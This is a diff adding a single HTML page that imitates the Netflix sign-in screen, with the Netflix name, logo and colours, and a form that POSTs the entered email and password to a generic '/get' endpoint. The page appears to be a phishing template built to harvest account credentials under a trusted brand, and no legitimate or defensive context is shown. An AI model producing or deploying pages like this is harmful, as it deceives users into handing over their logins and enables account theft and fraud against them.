@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Netflix</title>
+    <style>
+      body {
+        font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        background-color: #000;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 100%;
+        max-width: 400px;
+        padding: 0 20px;
+      }
+      #logo {
+        margin-bottom: 28px;
+      }
+      .form-box {
+        background: rgba(0,0,0,0.75);
+        border-radius: 4px;
+        padding: 60px 68px 40px;
+      }
+      .g-h1 {
+        font-size: 32px;
+        font-weight: 700;
+        color: #fff;
+        margin-bottom: 28px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 16px 20px;
+        border: 0;
+        border-radius: 4px;
+        font-size: 16px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+        background: #333;
+        color: #fff;
+      }
+      .g-input:focus {
+        background: #454545;
+      }
+      .g-input::placeholder {
+        color: #8c8c8c;
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 16px;
+        background-color: #e50914;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        margin-top: 24px;
+      }
+      .gbtn-primary:hover {
+        background: #f40612;
+      }
+      .remember {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        margin-top: 12px;
+        color: #b3b3b3;
+        font-size: 13px;
+      }
+      .remember input {
+        accent-color: #e50914;
+      }
+      .help {
+        float: right;
+        color: #b3b3b3;
+        font-size: 13px;
+        text-decoration: none;
+      }
+      .help:hover {
+        text-decoration: underline;
+        color: #fff;
+      }
+      .footer {
+        margin-top: 60px;
+        padding: 0 20px;
+        color: #808080;
+        font-size: 16px;
+      }
+      .footer a {
+        color: #fff;
+        text-decoration: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 111 30" width="167" height="45" fill="#e50914">
+        <path d="M105.06 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.094-13.874L94.999 0H99.28l3.031 7.719L105.625 0h5.063l-5.625 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.531 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.844zM30.75 0v21.875c2.75.156 5.5.343 8.25.594v4.5C34.688 26.094 29.25 26 24.25 26V0h6.5zm-12.874 0v26.25h-2.375c-1.75 0-3.563-.094-5.25-.25V0h7.625zM4.874 0v26.25H2.5c-1.75 0-3.563-.094-5.25-.25V0h7.625z"/>
+      </svg>
+      <div class="form-box">
+        <h1 class="g-h1">Sign In</h1>
+        <form action="/get" method="POST">
+          <input class="g-input" type="email" name="email" placeholder="Email or phone number" required>
+          <input class="g-input" type="password" name="password" placeholder="Password" required>
+          <button type="submit" class="gbtn-primary">Sign In</button>
+          <div class="remember">
+            <input type="checkbox" checked>Remember me
+            <a href="#" class="help">Need help?</a>
+          </div>
+        </form>
+      </div>
+      <div class="footer">
+        New to Netflix? <a href="#">Sign up now</a>.
+      </div>
+    </div>
+  </body>
+</html>
